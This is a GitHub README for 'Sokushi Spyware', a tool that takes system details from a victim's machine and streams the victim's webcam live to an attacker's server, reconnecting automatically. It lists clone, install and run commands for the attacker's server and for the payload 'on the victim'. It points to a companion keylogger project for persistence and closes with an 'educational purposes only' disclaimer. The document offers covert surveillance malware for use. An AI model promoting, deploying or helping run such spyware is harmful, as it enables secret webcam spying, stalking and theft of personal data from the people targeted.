# Sokushi Spyware

Sokushi Spyware, developed by A1SBERG, is a potent surveillance tool that establishes a remote connection between the victim's system and the attacker's server. The spyware discreetly extracts critical system information from the infected machine and streams live video from the victim’s webcam back to the attacker, effectively enabling full remote monitoring.

## Features
- **System Information Extraction**: Captures and sends critical system details, including OS, architecture, MAC address, and public IP.
- **Live Webcam Streaming**: Continuously streams live video from the victim’s webcam to the attacker.
- **Connection Persistence**: Automatically attempts to reconnect to the server if the connection is lost.

## Installation && Usage

1. Clone the repository:
   ```bash
   git clone https://github.com/Kuraiyume/Sokushi
   ```
2. Install the requirements:
   ```bash
   pip3 install -r requirements.txt
   ```
3. On the attacker machine, run the server:
   ```bash
   python3 server.py
   ```
4. On the victim, run the payload:
   ```bash
   python3 payload.py
   ```
*Remember to configure the payload based on the server to avoid complications and errors.*

## Now to make it persistent and run without Python Compiler installed
- You can follow the steps in Kiroku Keylogger ![here](https://github.com/Kuraiyume/Kiroku), the procedure will be the same.

## Legal Disclaimer
- This software is intended for educational purposes only. The author is not responsible for any illegal use of this tool. Misuse of this software can result in criminal charges being brought against the individuals in question. The user is solely responsible for compliance with all local laws.

## License
- Sokushi is licensed under MIT License

## Author
- Kuroshiro (A1SBERG)

